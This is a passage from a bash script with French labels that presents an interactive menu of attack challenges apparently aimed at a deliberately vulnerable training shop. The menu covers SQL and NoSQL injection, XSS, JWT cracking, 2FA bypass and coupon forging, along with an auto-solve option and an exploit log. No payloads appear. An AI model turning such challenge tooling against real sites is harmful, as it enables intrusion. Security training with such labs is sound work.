        echo -e "${GREEN}14) ğŸšª Admin Section â­â­${NC}"
        echo -e "${GREEN}15) ğŸ›’ View Basket â­â­${NC}"
        echo -e "${GREEN}16) â­ Five Star Feedback â­â­${NC}"
        echo -e "${GREEN}17) ğŸŸï¸  Forged Coupon â­â­â­â­â­â­${NC}"
        echo -e "${GREEN}18) ğŸ›’ Manipulate Basket â­â­â­${NC}"
        echo -e "${GREEN}19) ğŸ“œ Access Log â­â­â­â­${NC}"

        echo
        echo -e "${MAGENTA}â•â•â• SENSITIVE DATA (4) â•â•â•${NC}"
        echo -e "${GREEN}20) ğŸ“„ Confidential Doc â­${NC}"
        echo -e "${GREEN}21) ğŸ“Š Exposed Metrics â­${NC}"
        echo -e "${GREEN}22) ğŸ’¾ Sales Backup â­â­â­â­${NC}"
        echo -e "${GREEN}23) ğŸ’¾ Dev Backup â­â­â­â­${NC}"

        echo
        echo -e "${MAGENTA}â•â•â• MISCONFIGURATION (4) â•â•â•${NC}"
        echo -e "${GREEN}24) âš ï¸  Error Handling â­${NC}"
        echo -e "${GREEN}25) ğŸ—„ï¸  Deprecated Interface â­â­${NC}"
        echo -e "${GREEN}26) ğŸ“¦ Vulnerable Library â­â­â­â­${NC}"
        echo -e "${GREEN}27) ğŸ­ Typosquatting â­â­â­â­${NC}"

        echo
        echo -e "${MAGENTA}â•â•â• BONUS (3) â•â•â•${NC}"
        echo -e "${GREEN}28) ğŸ¯ Score Board â­${NC}"
        echo -e "${GREEN}29) ğŸ“œ Privacy Policy â­${NC}"
        echo -e "${GREEN}30) ğŸ’« Zero Stars â­${NC}"

        echo
        echo -e "${CYAN}â•â•â• SPECIAL â•â•â•${NC}"
        echo -e "${YELLOW}31) ğŸ¤– Auto Solve (challenges automatiques)${NC}"
        echo -e "${MAGENTA}32) ğŸ“Š Voir Scoreboard Complet${NC}"
        echo -e "${CYAN}33) ğŸ“ˆ Statistiques${NC}"
        echo -e "${CYAN}34) ğŸ“œ Logs${NC}"
        echo -e "${RED}0)  âŒ Retour${NC}"
        
        echo
        read -p "ğŸ‘‰ Choix : " choice

        case $choice in
            1) challenge_sqli_login ;;
            2) challenge_xss_search ;;
            3) challenge_xss_bonus ;;
            4) challenge_xss_client ;;
            5) challenge_nosql_login ;;
            6) challenge_xss_reflected ;;
            7) challenge_xss_api ;;
            8) challenge_ldap_injection ;;
            9) challenge_password_strength ;;
            10) challenge_security_question ;;
            11) challenge_jwt_cracking ;;
            12) challenge_oauth_password ;;
            13) challenge_2fa_bypass ;;
            14) challenge_admin_section ;;
            15) challenge_view_basket ;;
            16) challenge_five_star ;;
            17) challenge_forged_coupon ;;
            18) challenge_manipulate_basket ;;
            19) challenge_access_log ;;
            20) challenge_confidential_doc ;;
            21) challenge_exposed_metrics ;;
            22) challenge_sales_backup ;;
            23) challenge_dev_backup ;;
            24) challenge_error_handling ;;
            25) challenge_deprecated_interface ;;
            26) challenge_vulnerable_library ;;
            27) challenge_typosquatting ;;
            28) challenge_score_board ;;
            29) challenge_privacy_policy ;;
            30) challenge_zero_stars ;;
            31) auto_solve_all ;;
            32) verify_all_challenges ;;
            33) show_statistics ;;
            34)
                clear
                banner
                echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
                echo -e "${CYAN}â•‘              Logs d'Exploits               â•‘${NC}"
                echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
                echo

                if [ -f "$CHALLENGES_LOG" ]; then
                    cat "$CHALLENGES_LOG"
                else
                    echo -e "${YELLOW}Aucun log disponible${NC}"
                fi

                echo
                read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
                ;;
            0) return ;;
            *)
                echo -e "${RED}âŒ Choix invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# ==========================
# Point d'entrÃ©e
# ==========================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
